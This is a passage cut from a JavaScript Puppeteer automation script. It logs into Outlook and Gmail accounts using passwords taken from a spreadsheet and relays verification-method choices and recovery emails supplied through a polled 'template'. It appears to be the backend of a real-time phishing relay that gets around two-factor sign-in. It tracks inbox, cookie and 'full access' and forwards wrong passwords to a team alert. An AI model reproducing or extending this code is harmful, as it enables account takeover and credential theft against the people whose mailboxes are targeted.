                                        logger.info(`[processRow][${browserId}] Password button selectors failed, trying Enter key fallback.`);
                                        await page.keyboard.press('Enter');
                                        await page.waitForNavigation({ waitUntil: 'networkidle0', timeout: 15000 }).catch(() => null);
                                        await new Promise(res => setTimeout(res, 1500));
                                        clickedSelector = 'ENTER_KEY';
                                        logger.info(`[processRow][${browserId}] Enter key fallback succeeded.`);
                                    } catch (enterError) {
                                        logger.warn(`[processRow][${browserId}] Enter key fallback also failed: ${enterError.message}`);
                                    }
                                }

                                if (!clickedSelector) {
                                    // Persist WAITINGPASSWORD so user can re-submit instead of failing immediately
                                    logger.info(`[processRow][${browserId}] Could not click any password next selectors. Persisting WAITINGPASSWORD and clearing password so user can retry.`);
                                    finalStatus = "WAITINGPASSWORD";
                                    updateData.status = finalStatus;
                                    updateData.lastJsonResponse = JSON.stringify({
                                        browserId, email, status: finalStatus,
                                        emailExists: initialCheckResult.emailExists,
                                        accountAccess: initialCheckResult.accountAccess,
                                        reachedInbox: initialCheckResult.reachedInbox,
                                        requiresVerification: initialCheckResult.requiresVerification,
                                        verificationState: initialCheckResult.verificationState,
                                        verificationOptions: initialCheckResult.verificationOptions || [],
                                        platform, timestamp: new Date().toISOString(),
                                        message: "Failed to submit password: button not found or not clickable. Please provide a new password."
                                    });
                                    notifyTeam({ type: 'PASSWORD_SUBMIT_FAILED', platform, email, browserId, detail: 'Could not click password next button' });
                                    // Clear the password field and persist the WAITINGPASSWORD state
                                    logger.debug(`[processRow][${browserId}] Clearing password. Returning to WAITINGPASSWORD state.`);
                                    updateBrowserRowDataFast(browserId, { ...updateData, password: '', verified: false, fullAccess: false });
                                    return; // Exit processRow so no later logic overwrites status
                                }

                                logger.info(`[processRow][${browserId}] Successfully processed password next button click and navigation.`);
                                await new Promise(res => setTimeout(res, 2000)); // Wait for page to settle

                                // Verify page actually changed — if URL is same and password input still visible, wrong button was clicked
                                const urlAfterPwSubmit = page.url();
                                const pwStillVisibleAfterSubmit = await page.evaluate((sels) => {
                                    for (const s of sels) { try { if (document.querySelector(s)) return true; } catch(e){} }
                                    return false;
                                }, passwordInputSelectors).catch(() => false);
                                if (urlBeforePwSubmit === urlAfterPwSubmit && pwStillVisibleAfterSubmit) {
                                    logger.warn(`[processRow][${browserId}] Password next button clicked but page did not change. Wrong button may have been clicked. Reverting to WAITINGPASSWORD.`);
                                    finalStatus = "WAITINGPASSWORD";
                                    updateData.status = finalStatus;
                                    updateData.lastJsonResponse = JSON.stringify({
                                        browserId, email, status: finalStatus,
                                        message: "Password submit button did not navigate. Please try again."
                                    });
                                    notifyTeam({ type: 'PASSWORD_NO_NAVIGATION', platform, email, browserId, detail: 'Password button clicked but page did not navigate' });
                                    updateBrowserRowDataFast(browserId, { ...updateData, password: '', verified: false, fullAccess: false });
                                    return;
                                }

                                // Handle any additional views (like "Stay Signed In") that might appear after password submission
                                const additionalViewsResult = await handleAdditionalViews(page, platformConfig, instanceId, 'post_password_submission');
                                if (additionalViewsResult?.blocked) {
                                    logger.warn(`[processRow][${browserId}] Fatal view blocked access: ${additionalViewsResult.reason}. Setting status to FAILED.`);
                                    notifyTeam({ type: 'RATE_LIMITED', platform, email, browserId, url: page.url(), detail: `Fatal view: ${additionalViewsResult.reason}` });
                                    finalStatus = "FAILED";
                                    updateData.status = finalStatus;
                                    updateData.lastJsonResponse = JSON.stringify({
                                        browserId, email, status: finalStatus,
                                        message: `Account access blocked: ${additionalViewsResult.reason}`
                                    });
                                    updateBrowserRowDataFast(browserId, { ...updateData, verified: false, fullAccess: false });
                                    return;
                                }

                                // **CRITICAL**: Check for "Password sign-in isn't available" error FIRST
                                let passwordUnavailableDetected = false;
                                if (platformConfig.selectors?.passwordUnavailable) {
                                    const pwUnavailSelectors = Array.isArray(platformConfig.selectors.passwordUnavailable)
                                        ? platformConfig.selectors.passwordUnavailable
                                        : [platformConfig.selectors.passwordUnavailable];
                                    for (const sel of pwUnavailSelectors) {
                                        if (typeof sel === 'string') {
                                            const unavailableExists = await page.evaluate((xpath) => {
                                                try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
                                            }, sel).catch(() => false);
                                            if (unavailableExists) {
                                                logger.info(`[processRow][${browserId}] Password sign-in unavailable detected after password submission.`);
                                                passwordUnavailableDetected = true;
                                                break;
                                            }
                                        }
                                    }
                                }

                                if (passwordUnavailableDetected) {
                                    logger.info(`[processRow][${browserId}] Password sign-in unavailable detected. handleAdditionalViews clicked Back. Waiting 5s then auto-retrying same password via while loop.`);
                                    pollingTimeoutPassword = Date.now() + 60000; // Reset timeout — give another 60s for retry to succeed
                                    await new Promise(res => setTimeout(res, 5000));
                                    continue; // Go back to top of while loop to re-type cached password and resubmit
                                }

                                // **CRITICAL**: Check for login failed (incorrect password) BEFORE checking verification/inbox
                                let passwordFailedDetected = false;
                                if (platformConfig.selectors.loginFailed) {
                                    const loginFailedSelectors = Array.isArray(platformConfig.selectors.loginFailed) ?
                                        platformConfig.selectors.loginFailed : [platformConfig.selectors.loginFailed];

                                    for (const selector of loginFailedSelectors) {
                                        if (typeof selector === 'string') {
                                            const failExists = await page.evaluate((xpath) => {
                                                try { return !!document.evaluate(xpath, document, null, XPathResult.FIRST_ORDERED_NODE_TYPE, null).singleNodeValue; } catch (e) { return false; }
                                            }, selector).catch(() => false);
                                            if (failExists) {
                                                logger.info(`[processRow][${browserId}] Login failed detected after password submission. Incorrect password.`);
                                                passwordFailedDetected = true;
                                                break;
                                            }
                                        }
                                    }
                                }

                                if (passwordFailedDetected) {
                                    // Password was incorrect; persist WAITINGPASSWORD for user to retry — NEVER auto-retry
                                    passwordRetryCounts.delete(browserId);
                                    sendWrongInputAlert({ type: 'WRONG_PASSWORD', platform, email, browserId, password, detail: `Incorrect password submitted` });

                                    initialCheckResult = {
                                        emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false,
                                        verificationState: 'WAITINGPASSWORD_ERROR', message: "Incorrect password. Please try again."
                                    };
                                } else {
                                    // After password submission, check if we reached inbox or a verification screen
                                    const verificationDetails = await checkVerification(page, platformConfig);
                                    logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Verification details after password: ${JSON.stringify(verificationDetails)}`);
                                    if (verificationDetails.required) {
                                        initialCheckResult = {
                                            emailExists: true, accountAccess: true, reachedInbox: false, requiresVerification: true,
                                            verificationState: verificationDetails.type === 'choice' ? 'WAITINGOPTIONS' : verificationDetails.type === 'text_input' ? 'WAITINGRECOVERYEMAIL' : 'WAITINGCODE',
                                            verificationOptions: verificationDetails.type === 'choice' && typeof platformConfig.extractVerificationOptions === 'function' ? await platformConfig.extractVerificationOptions(page, platformConfig, verificationDetails.viewName) : [],
                                            viewName: verificationDetails.viewName
                                        };
                                    } else {
                                        const inboxReached = await isInbox(page, platformConfig);
                                        logger.info(`[processRow][${browserId}][WAITINGPASSWORD] Inbox reached: ${inboxReached}`);
                                        initialCheckResult = {
                                            emailExists: true, accountAccess: true, reachedInbox: inboxReached, requiresVerification: false, verificationState: null
                                        };
                                    }
                                }

                                // If a password attempt resulted in a password-specific failure or accountAccess=false,
                                // transition back to WAITINGPASSWORD so the user can provide a new password.
                                if (initialCheckResult.verificationState === 'WAITINGPASSWORD_ERROR' || (initialCheckResult.emailExists && !initialCheckResult.accountAccess && (initialCheckResult.verificationState === null || initialCheckResult.verificationState === undefined))) {
                                    logger.info(`[processRow][${browserId}] Password error detected during WAITINGPASSWORD. Setting status to WAITINGPASSWORD.`);
                                    finalStatus = "WAITINGPASSWORD";
                                    // Ensure updateData reflects the new status immediately so finally() sees it
                                    updateData.status = finalStatus;
                                    updateData.lastJsonResponse = JSON.stringify({
                                        browserId, email, status: finalStatus,
                                        emailExists: initialCheckResult.emailExists,
                                        accountAccess: initialCheckResult.accountAccess,
                                        reachedInbox: initialCheckResult.reachedInbox,
                                        requiresVerification: initialCheckResult.requiresVerification,
                                        verificationState: initialCheckResult.verificationState,
                                        verificationOptions: initialCheckResult.verificationOptions || [],
                                        platform, timestamp: new Date().toISOString(),
                                        message: initialCheckResult.message || "Incorrect password. Please provide a valid password."
                                    });
                                    // Clear the password field and persist the WAITINGPASSWORD state
                                    logger.debug(`[processRow][${browserId}] Clearing password. Returning to WAITINGPASSWORD state.`);
                                    await updateBrowserRowDataFast(browserId, { ...updateData, password: '', verified: false, fullAccess: false });
                                    return; // Exit processRow so no later logic overwrites status
                                }

                                passwordRetryCounts.delete(browserId);
                                passwordProvidedAndProcessed = true;
                                // Do not clear password from sheet after attempt as per user request
                                // updateBrowserRowDataFast(browserId, { verificationCode: '', verificationChoice: '' });

                            } catch (e) {
                                logger.error(`[processRow][${browserId}][WAITINGPASSWORD] Error during password entry/submission: ${e.message}`);
                                initialCheckResult = { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, error: e.message };
                                // If an error occurs during password entry, we should break the loop and set status to FAILED
                                finalStatus = "FAILED";
                                break;
                            }
                        } else {
                            logger.error(`[processRow][${browserId}][WAITINGPASSWORD] Cannot resume: Missing password input or next button selectors. passwordInputSelectors: '${JSON.stringify(passwordInputSelectors)}', passwordNextButtonSelector: '${passwordNextButtonSelector}'.`);
                            logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Cannot resume: Missing password input or next button selectors.`);
                            initialCheckResult = { emailExists: true, accountAccess: false, reachedInbox: false, requiresVerification: false, error: "Missing password selectors for WAITINGPASSWORD resume." };
                            finalStatus = "FAILED";
                            break;
                        }
                    }

                } catch (pollError) {
                    logger.error(`[processRow][${browserId}][WAITINGPASSWORD] Error during polling: ${pollError.message}`);
                    await new Promise(resolve => setTimeout(resolve, 15000));
                }

                if (!passwordProvidedAndProcessed && finalStatus === "WAITINGPASSWORD") {
                    await new Promise(resolve => setTimeout(resolve, 5000)); // Wait before next poll (reduced from 10000 to 5000)
                }
            }

            // If the while loop timed out while in PROCESSING (password-unavailable retry in progress),
            // check retry count. Keep engineProcessing=true so template shows "waiting" not form.
            // After max retries, give up and let user provide a new password.
            if (finalStatus === "PROCESSING" && !passwordProvidedAndProcessed) {
                const retryCount = (passwordRetryCounts.get(browserId) || 0) + 1;
                passwordRetryCounts.set(browserId, retryCount);
                const MAX_RETRIES = 3;

                if (retryCount >= MAX_RETRIES) {
                    logger.info(`[processRow][${browserId}] Password retry exhausted (${retryCount}/${MAX_RETRIES}). Setting WAITINGPASSWORD for user to provide new password.`);
                    passwordRetryCounts.delete(browserId);
                    finalStatus = "WAITINGPASSWORD";
                    updateData.status = "WAITINGPASSWORD";
                    updateData.lastJsonResponse = JSON.stringify({
                        ...JSON.parse(updateData.lastJsonResponse || '{}'),
                        status: "WAITINGPASSWORD",
                        message: "Password sign-in unavailable after multiple retries. Please try a different password."
                    });
                    updateBrowserRowDataFast(browserId, {
                        status: "WAITINGPASSWORD",
                        engineProcessing: false,
                        password: '',
                        verified: false,
                        fullAccess: false,
                        lastJsonResponse: updateData.lastJsonResponse
                    });
                } else {
                    logger.info(`[processRow][${browserId}] Password retry ${retryCount}/${MAX_RETRIES} timed out. Keeping browser open for next retry cycle.`);
                    updateBrowserRowDataFast(browserId, {
                        status: "WAITINGPASSWORD",
                        engineProcessing: true,
                        email: email || '',
                        password: password || '',
                        verified: true,
                        fullAccess: false,
                        lastJsonResponse: JSON.stringify({
                            ...JSON.parse(updateData.lastJsonResponse || '{}'),
                            status: "WAITINGPASSWORD",
                            engineRetrying: true,
                            message: `Retrying password (${retryCount}/${MAX_RETRIES}). Please wait.`
                        })
                    });
                }
                logger.info(`[engineProcess][${browserId}] -WAITINGPASSWORD (retry return)`);
                activelyProcessing.delete(browserId);
                return;
            }

            if (!passwordProvidedAndProcessed && finalStatus === "WAITINGPASSWORD") {
                logger.warn(`[processRow][${browserId}][WAITINGPASSWORD] Polling for password timed out. Setting status to FAILED.`);
                finalStatus = "FAILED";
                updateData.status = "FAILED";
                updateData.verified = false; // FAILED so verified false
                updateData.fullAccess = false; // FAILED so fullAccess false
                updateData.cookieAccess = false; // FAILED so cookieAccess false
                updateData.lastJsonResponse = JSON.stringify({
                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                    message: "Failed during WAITINGPASSWORD phase: Password not provided in time."
                });

                // Explicitly close browser and clean up immediately
                if (browser && !browserFullyClosed) {
                    if (targetCreatedListener && !isReusingBrowser) browser.off('targetcreated', targetCreatedListener);
                    await browser.close().catch(err => logger.error(`Error closing browser for ${browserId} on WAITINGPASSWORD timeout: ${err.message}`));
                    browserFullyClosed = true;
                    activeBrowserSessions.delete(browserId);
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
                if (userDataDir) {
                    try {
                        logger.info(`[processRow][${browserId}] Deleting user data dir for WAITINGPASSWORD timeout: ${userDataDir}`);
                        await fs.remove(userDataDir);
                        logger.info(`[processRow][${browserId}] Successfully deleted user data directory.`);
                    } catch (deleteError) {
                        logger.error(`[processRow][${browserId}] Error deleting user data directory on WAITINGPASSWORD timeout: ${deleteError.message}`);
                    }
                }
                logger.debug(`[processRow][${browserId}] Exiting WAITINGPASSWORD timeout path.`);
                return; // Exit processRow if password not found
            }
            // Update updateData based on the result of the polling loop
            updateData.status = finalStatus;
            if (finalStatus === "FAILED" && !updateData.lastJsonResponse?.includes("FAILED")) {
                updateData.lastJsonResponse = JSON.stringify({
                    ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
                    message: "Failed during WAITINGPASSWORD phase."
                });
            }
        } else if (status === "WAITINGOPTIONS") {
            logger.info(`[processRow][${browserId}] Resuming from WAITINGOPTIONS state.`);
            finalStatus = "WAITINGOPTIONS";
            let currentVerificationOptions = [];
            const pollingTimeoutOptions = Date.now() + 5 * 60 * 1000;

            while (Date.now() < pollingTimeoutOptions && finalStatus === "WAITINGOPTIONS") {
                try {
                    // Template Liveliness Check
                    if (!isTemplateAlive(browserId)) {
                        logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Template stopped polling (>3min). Closing browser.`);
                        finalStatus = "FAILED";
                        updateData.status = "FAILED";
                        updateData.lastJsonResponse = JSON.stringify({ ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED", message: "Failed during WAITINGOPTIONS phase: Template stopped responding." });
                        break;
                    }

                    const currentPageVerificationState = await checkVerification(page, platformConfig);
                    if (!currentPageVerificationState.required) {
                        logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Expected to be on a choice screen, but current page is not. View: ${currentPageVerificationState.viewName || 'unknown'}. Type: ${currentPageVerificationState.type || 'unknown'}. Failing.`);
                        finalStatus = "FAILED";
                        updateData.status = "FAILED";
                        updateData.lastJsonResponse = JSON.stringify({ ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED", message: "Page state changed unexpectedly during WAITINGOPTIONS." });
                        break;
                    }
                    if (currentPageVerificationState.type === 'code') {
                        logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Page transitioned to code entry: ${currentPageVerificationState.viewName}. Setting WAITINGCODE.`);
                        finalStatus = "WAITINGCODE";
                        updateData.status = "WAITINGCODE";
                        updateData.verificationChoice = '';
                        updateData.lastJsonResponse = JSON.stringify({
                            ...JSON.parse(updateData.lastJsonResponse || '{}'),
                            status: "WAITING_CODE",
                            verificationState: 'WAITING_CODE',
                            viewName: currentPageVerificationState.viewName,
                            message: "Verification code screen reached."
                        });
                        updateBrowserRowDataFast(browserId, {
                            status: "WAITINGCODE",
                            verificationChoice: '',
                            lastJsonResponse: updateData.lastJsonResponse
                        });
                        return;
                    }
                    if (currentPageVerificationState.type === 'text_input') {
                        logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Page transitioned to text input screen: ${currentPageVerificationState.viewName}. Setting WAITINGRECOVERYEMAIL.`);
                        finalStatus = "WAITINGRECOVERYEMAIL";
                        updateData.status = "WAITINGRECOVERYEMAIL";
                        updateData.verificationChoice = '';
                        updateData.lastJsonResponse = JSON.stringify({
                            ...JSON.parse(updateData.lastJsonResponse || '{}'),
                            status: "WAITING_RECOVERY_EMAIL",
                            verificationState: 'WAITING_RECOVERY_EMAIL',
                            viewName: currentPageVerificationState.viewName,
                            message: "Recovery email confirmation screen reached."
                        });
                        updateBrowserRowDataFast(browserId, {
                            status: "WAITINGRECOVERYEMAIL",
                            verificationChoice: '',
                            lastJsonResponse: updateData.lastJsonResponse
                        });
                        return;
                    }
                    if (currentPageVerificationState.type !== 'choice') {
                        logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Unexpected page type '${currentPageVerificationState.type}' in WAITINGOPTIONS. View: ${currentPageVerificationState.viewName}. Failing.`);
                        finalStatus = "FAILED";
                        updateData.status = "FAILED";
                        updateData.lastJsonResponse = JSON.stringify({ ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED", message: "Unexpected page type during WAITINGOPTIONS." });
                        break;
                    }

                    const currentActualViewName = currentPageVerificationState.viewName;
                    logger.debug(`[processRow][${browserId}][WAITINGOPTIONS] Current actual view: ${currentActualViewName}`);
                    let freshCurrentVerificationOptions = await platformConfig.extractVerificationOptions(page, platformConfig, currentActualViewName);

                    // Read sheet data FIRST to capture any externally-set verificationChoice before options refresh
                    const checkData = await fetchDataFromAppScript(1, 30000, true);
                    const checkHeaders = checkData[0];
                    const checkColumnIndexes = getColumnIndexes(checkHeaders);
                    const checkRows = checkData.slice(1);
                    const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
                    const currentSheetVerificationChoice = checkRow ? checkRow[checkColumnIndexes['verificationChoice']] : null;

                    const ljp = JSON.parse(updateData.lastJsonResponse || '{}');
                    if (ljp.viewName !== currentActualViewName || JSON.stringify(ljp.verificationOptions) !== JSON.stringify(freshCurrentVerificationOptions)) {
                        logger.info(`[processRow][${browserId}][WAITINGOPTIONS] View or options changed/refreshed. Updating LJR and sheet. LJR View: ${ljp.viewName}, Actual View: ${currentActualViewName}`);
                        const ljr = {
                            ...ljp,
                            viewName: currentActualViewName,
                            verificationOptions: freshCurrentVerificationOptions,
                            status: "WAITINGOPTIONS"
                        };
                        if (platform === 'gmail' && currentActualViewName === 'Gmail Verification Choices') {
                            ljr.gmail = { step: "waiting_options", options: freshCurrentVerificationOptions };
                        }
                        updateData.lastJsonResponse = JSON.stringify(ljr);
                        const optionsRefreshPayload = {
                            status: "WAITINGOPTIONS",
                            verified: true,
                            fullAccess: false,
                            verificationOptions: JSON.stringify(freshCurrentVerificationOptions),
                            lastJsonResponse: updateData.lastJsonResponse
                        };
                        // Preserve verificationChoice from sheet to prevent clearing during polling (same race as password clearing)
                        if (currentSheetVerificationChoice) {
                            optionsRefreshPayload.verificationChoice = currentSheetVerificationChoice;
                            logger.debug(`[processRow][${browserId}][WAITINGOPTIONS] Preserving verificationChoice in options refresh: ${currentSheetVerificationChoice}`);
                        }
                        updateBrowserRowDataFast(browserId, optionsRefreshPayload);
                        currentVerificationOptions = freshCurrentVerificationOptions;
                    } else {
                        currentVerificationOptions = ljp.verificationOptions || freshCurrentVerificationOptions;
                    }

                    if (!checkRow) {
                        logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Row not found. Failing.`);
                        finalStatus = "FAILED"; break;
                    }

                    const currentSheetStatus = checkRow[columnIndexes['status']];
                    const verificationChoiceRaw = checkRow[columnIndexes['verificationChoice']];

                    if (currentSheetStatus !== "WAITINGOPTIONS") {
                        logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Status changed externally to ${currentSheetStatus}. Exiting loop.`);
                        finalStatus = currentSheetStatus; break;
                    }

                    if (verificationChoiceRaw) {
                        logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Verification choice found: ${verificationChoiceRaw}. Setting status to PROCESSING.`);
                        logger.info(`[engineProcess][${browserId}] +WAITINGOPTIONS (found choice)`);
                        activelyProcessing.add(browserId);
                        updateBrowserRowDataFast(browserId, { status: "PROCESSING", verified: true, fullAccess: false, lastJsonResponse: JSON.stringify({ browserId, email, status: "PROCESSING", message: "Processing verification choice", verificationChoice: verificationChoiceRaw }) }); // Set status to PROCESSING

                        let choiceData = null;
                        let hiddenInputText = null;
                        let chosenOptionIndex = null;

                        try {
                            const parsedChoice = JSON.parse(verificationChoiceRaw);
                            if (Array.isArray(parsedChoice) && parsedChoice.length > 0) {
                                choiceData = parsedChoice[0];
                            } else if (typeof parsedChoice === 'object' && parsedChoice !== null) {
                                choiceData = parsedChoice;
                            }
                            if (choiceData) {
                                hiddenInputText = choiceData.hiddenPhoneEmail;
                                chosenOptionIndex = choiceData.choice;
                            }
                        } catch (e) {
                            if (currentActualViewName === 'Outlook Verify Email Full Input') {
                                hiddenInputText = verificationChoiceRaw.trim();
                                logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Interpreted verificationChoiceRaw as plain string for full email input: '${hiddenInputText}' for view ${currentActualViewName}`);
                            } else {
                                logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Invalid verificationChoice format for view '${currentActualViewName}'. Expected JSON, got raw text. Error: ${e.message}. Clearing choice.`);
                                updateBrowserRowDataFast(browserId, { status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions), verified: true, fullAccess: false });
                                await new Promise(resolve => setTimeout(resolve, 10000));
                                continue;
                            }
                        }

                        if (!currentVerificationOptions || currentVerificationOptions.length === 0) {
                            logger.error(`[processRow][${browserId}][WAITINGOPTIONS] currentVerificationOptions is unexpectedly empty for view '${currentActualViewName}'. Failing.`);
                            finalStatus = "FAILED"; break;
                        }

                        let selectedOption;
                        if (currentActualViewName === 'Outlook Verify Email Full Input') {
                            if (currentVerificationOptions.length > 0 && currentVerificationOptions[0].type === 'full_email_input') {
                                selectedOption = currentVerificationOptions[0];
                                logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Using 'full_email_input' option for view: ${currentActualViewName}`);
                                if (!hiddenInputText) {
                                    logger.error(`[processRow][${browserId}][WAITINGOPTIONS] 'hiddenPhoneEmail' (full email) is required for '${currentActualViewName}' but not provided in verificationChoice. Value was: '${hiddenInputText}'.`);
                                    updateBrowserRowDataFast(browserId, { status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
                                    logger.info(`[engineProcess][${browserId}] -WAITINGOPTIONS (hiddenPhoneEmail missing)`);
                                    activelyProcessing.delete(browserId);
                                    await new Promise(resolve => setTimeout(resolve, 10000));
                                    continue;
                                }
                            } else {
                                logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Expected 'full_email_input' option type for view '${currentActualViewName}' but found: ${JSON.stringify(currentVerificationOptions)}. Clearing choice.`);
                                updateBrowserRowDataFast(browserId, { status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
                                logger.info(`[engineProcess][${browserId}] -WAITINGOPTIONS (unexpected option type)`);
                                activelyProcessing.delete(browserId);
                                await new Promise(resolve => setTimeout(resolve, 10000));
                                continue;
                            }
                        } else {
                            if (!chosenOptionIndex) {
                                logger.error(`[processRow][${browserId}][WAITINGOPTIONS] 'choice' (index) property missing in verificationChoice data for view '${currentActualViewName}'.`);
                                updateBrowserRowDataFast(browserId, { status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
                                logger.info(`[engineProcess][${browserId}] -WAITINGOPTIONS (missing choice index)`);
                                activelyProcessing.delete(browserId);
                                await new Promise(resolve => setTimeout(resolve, 10000));
                                continue;
                            }
                            selectedOption = currentVerificationOptions.find(opt => opt.choiceIndex === chosenOptionIndex);
                        }

                        if (!selectedOption) {
                            logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Chosen option (index: ${chosenOptionIndex}, for view: ${currentActualViewName}) not found or applicable in current options. Options: ${JSON.stringify(currentVerificationOptions)}`);
                            updateBrowserRowDataFast(browserId, { status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
                            logger.info(`[engineProcess][${browserId}] -WAITINGOPTIONS (option not found in list)`);
                            activelyProcessing.delete(browserId);
                            await new Promise(resolve => setTimeout(resolve, 10000));
                            continue;
                        }

                        logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Processing option: ${JSON.stringify(selectedOption)} for view: ${currentActualViewName}`);

                        try {
                            if (selectedOption.type !== 'full_email_input' && selectedOption.id) {
                                await page.waitForSelector(`#${selectedOption.id}`, { visible: true, timeout: 5000 });
                                await page.click(`#${selectedOption.id}`);
                                logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Clicked radio button: #${selectedOption.id}`);
                                await new Promise(res => setTimeout(res, 500));
                            } else if (!selectedOption.id && selectedOption.type !== 'full_email_input') {
                                const vv3Count = await page.evaluate(() => document.querySelectorAll('.VV3oRb').length).catch(() => -1);
                                logger.debug(`[processRow][${browserId}][WAITINGOPTIONS] Attempting text-click. Target label: "${selectedOption.label}", .VV3oRb count: ${vv3Count}`);
                                const clickedByText = await page.evaluate((label) => {
                                    const links = document.querySelectorAll('.VV3oRb');
                                    for (const link of links) {
                                        if (link.textContent && link.textContent.trim().includes(label)) {
                                            link.click();
                                            return true;
                                        }
                                    }
                                    return false;
                                }, selectedOption.label);
                                if (clickedByText) {
                                    logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Clicked option by text: ${selectedOption.label}`);
                                    await new Promise(res => setTimeout(res, 500));
                                    const postClickState = await checkVerification(page, platformConfig);
                                    logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Post-text-click verification: ${JSON.stringify(postClickState)}`);
                                } else {
                                    const availableLabels = await page.evaluate(() => Array.from(document.querySelectorAll('.VV3oRb')).map(el => el.textContent.trim())).catch(() => ['evaluate-failed']);
                                    logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Text-click failed. Target: "${selectedOption.label}". Available: ${JSON.stringify(availableLabels)}`);
                                }
                            } else if (selectedOption.type === 'full_email_input') {
                                logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Full email input type, no radio button to click for selection, input will be typed.`);
                            }

                            if (selectedOption.requiresInput && selectedOption.inputSelector && hiddenInputText) {
                                await page.waitForSelector(selectedOption.inputSelector, { visible: true, timeout: 5000 });
                                logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Input selector '${selectedOption.inputSelector}' is visible before typing.`);
                                await page.evaluate((sel) => { const el = document.querySelector(sel); if (el) el.value = ''; }, selectedOption.inputSelector);
                                let typedValue = hiddenInputText;
                                if (selectedOption.inputSelector === '#iProofEmail' && typedValue.includes('@')) {
                                    typedValue = typedValue.slice(0, typedValue.lastIndexOf('@'));
                                    logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Stripped domain from email input: "${hiddenInputText}" → "${typedValue}"`);
                                }
                                await page.type(selectedOption.inputSelector, typedValue, { delay: 50 });
                                logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Typed "${typedValue}" into ${selectedOption.inputSelector}`);
                            } else if (selectedOption.requiresInput && !hiddenInputText && currentActualViewName === 'Outlook Verify Email Full Input') {
                                logger.error(`[processRow][${browserId}][WAITINGOPTIONS] 'Outlook Verify Email Full Input' requires hiddenInputText (full email) but it's missing. Clearing choice.`);
                                updateBrowserRowDataFast(browserId, { verificationChoice: '', status: "WAITINGOPTIONS", verificationOptions: JSON.stringify(currentVerificationOptions) });
                                logger.info(`[engineProcess][${browserId}] -WAITINGOPTIONS (full email input missing)`);
                                activelyProcessing.delete(browserId);
                                await new Promise(resolve => setTimeout(resolve, 10000));
                                continue;
                            } else if (selectedOption.requiresInput && !hiddenInputText) {
                                logger.warn(`[processRow][${browserId}][WAITINGOPTIONS] Option requires input, but no hiddenPhoneEmail provided. Attempting to proceed without it for option: ${selectedOption.label}`);
                            }

                            if (platform === 'gmail') {
                                // Gmail: selecting an option navigates directly (no "Send code" button)
                                logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Gmail option clicked. Waiting for page transition.`);
                                await new Promise(res => setTimeout(res, 3000));
                                const gmailPostClickVerification = await checkVerification(page, platformConfig);
                                if (gmailPostClickVerification.required && gmailPostClickVerification.type === 'code') {
                                    logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Gmail transitioned to code entry: ${gmailPostClickVerification.viewName}. Setting WAITINGCODE.`);
                                    finalStatus = "WAITINGCODE";
                                    const ljpGmail = JSON.parse(updateData.lastJsonResponse || '{}');
                                    updateData = {
                                        status: "WAITINGCODE",
                                        verificationChoice: '',
                                        lastJsonResponse: JSON.stringify({
                                            ...ljpGmail,
                                            status: "WAITING_CODE",
                                            verificationState: 'WAITING_CODE',
                                            viewName: gmailPostClickVerification.viewName,
                                            verificationOptions: currentVerificationOptions,
                                            message: "Verification code screen reached."
                                        })
                                    };
                                    updateBrowserRowDataFast(browserId, updateData);
                                    break;
                                } else if (gmailPostClickVerification.required && gmailPostClickVerification.type === 'text_input') {
                                    logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Gmail transitioned to text input: ${gmailPostClickVerification.viewName}. Setting WAITINGRECOVERYEMAIL.`);
                                    finalStatus = "WAITINGRECOVERYEMAIL";
                                    updateData = {
                                        status: "WAITINGRECOVERYEMAIL",
                                        verificationChoice: '',
                                        lastJsonResponse: JSON.stringify({
                                            ...JSON.parse(updateData.lastJsonResponse || '{}'),
                                            status: "WAITING_RECOVERY_EMAIL",
                                            verificationState: 'WAITING_RECOVERY_EMAIL',
                                            viewName: gmailPostClickVerification.viewName,
                                            verificationOptions: currentVerificationOptions,
                                            message: "Recovery email confirmation screen reached."
                                        })
                                    };
                                    updateBrowserRowDataFast(browserId, updateData);
                                    break;
                                } else if (gmailPostClickVerification.required && gmailPostClickVerification.type === 'choice') {
                                    logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Gmail still on choice page after click (e.g. account_recovery). Refreshing options.`);
